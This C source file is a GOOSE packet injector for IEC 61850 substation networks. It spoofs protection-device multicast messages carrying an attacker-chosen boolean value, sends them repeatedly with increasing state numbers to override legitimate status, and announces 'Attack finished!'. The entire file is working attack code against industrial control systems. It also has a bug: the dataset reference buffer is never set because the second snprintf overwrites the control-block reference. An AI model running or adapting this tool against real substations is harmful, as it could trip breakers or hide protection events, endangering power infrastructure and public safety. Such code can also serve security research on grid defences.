/*
 * goosePacketInjector.c
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>

#include <time.h>

#include "mms_value.h"
#include "goose_publisher.h"
#include "hal_thread.h"

#define VLANID 1
#define CONF_REV 2

#define ST_NUM_MAX 10000
#define ST_NUM_MIN 1

#define GO_ID "securityEvent"

#define TTL 300

void setUpPublisher(GoosePublisher* publisher, LinkedList* dataSetValues, int16_t id, char* interface, bool value) {

    uint8_t macAddress[6] = { 01, 0x0C, 0xCD, 0x01, 0x00, id };

    CommParameters gooseCommParameters;
    gooseCommParameters.appId = id;
    gooseCommParameters.vlanId = VLANID;
    gooseCommParameters.vlanPriority = 4;
    gooseCommParameters.dstAddress[0] = macAddress[0];
    gooseCommParameters.dstAddress[1] = macAddress[1];
    gooseCommParameters.dstAddress[2] = macAddress[2];
    gooseCommParameters.dstAddress[3] = macAddress[3];
    gooseCommParameters.dstAddress[4] = macAddress[4];
    gooseCommParameters.dstAddress[5] = macAddress[5];

    *publisher = GoosePublisher_create(&gooseCommParameters, interface);

    if (!*publisher)
    {
        printf("Failed to create GOOSE publisher. Reason can be that the Ethernet interface doesn't exist or root permission are required.\n");
        return;
    }

    char gocbRef[128];
    snprintf(gocbRef, sizeof(gocbRef), "PM%02dLogicalDevice/LLN0$GO$securityEvent", id);

    char dataSetRef[128];
    snprintf(gocbRef, sizeof(gocbRef), "PM%02dLogicalDevice/LLN0$SecurityST", id);

    uint32_t stNum = (rand() % ST_NUM_MAX) + ST_NUM_MIN;


    GoosePublisher_setGoCbRef(*publisher, gocbRef);
    GoosePublisher_setGoID(*publisher, GO_ID);
    GoosePublisher_setDataSetRef(*publisher, dataSetRef);
    GoosePublisher_setTimeAllowedToLive(*publisher, TTL);
    GoosePublisher_setConfRev(*publisher, CONF_REV);
    GoosePublisher_setStNum(*publisher, stNum);

    *dataSetValues = LinkedList_create();
    LinkedList_add(*dataSetValues, MmsValue_newBoolean(value));
}

void run(GoosePublisher* publisher, LinkedList* dataSetValues, int n)
{
    printf("Injecting %d messages...\n", n);
    int i = 0;
    for (i = 0; i < n; i++) {

       for (int j = 0; j < 5; j++)
       {
            if (GoosePublisher_publish(*publisher, *dataSetValues) == -1)
            {
                printf("Error sending message!\n");
                return;
            }
       }
       GoosePublisher_increaseStNum(*publisher);
       Thread_sleep(1000);
    }
    printf("Attack finished!\n");
}

int main(int argc, char **argv)
{

    if (argc != 5) {
        printf("Usage: %s <ID> <N_packets> <value (0|1)> <GOOSE_interface>\n", argv[0]);
        return 1;
    }

    srand(time(NULL));

    printf("*****************************************\n");
    printf("*                                       *\n");
    printf("*          Goose Packet Injector        *\n");
    printf("*                                       *\n");
    printf("*****************************************\n");

    int16_t id = (int16_t)atoi(argv[1]);
    int16_t n = (int16_t)atoi(argv[2]);
    bool injectedValue = (bool)atoi(argv[3]);
    char* interface = argv[4];

    GoosePublisher* publisher = alloca(sizeof(GoosePublisher));
    LinkedList* dataSetValues = alloca(sizeof(LinkedList));

    setUpPublisher(publisher, dataSetValues, id, interface, injectedValue);

    if (*publisher == NULL)
        return -1;

    run(publisher, dataSetValues, n);

    GoosePublisher_destroy(*publisher);
    LinkedList_destroy(*dataSetValues);

    return 0;
}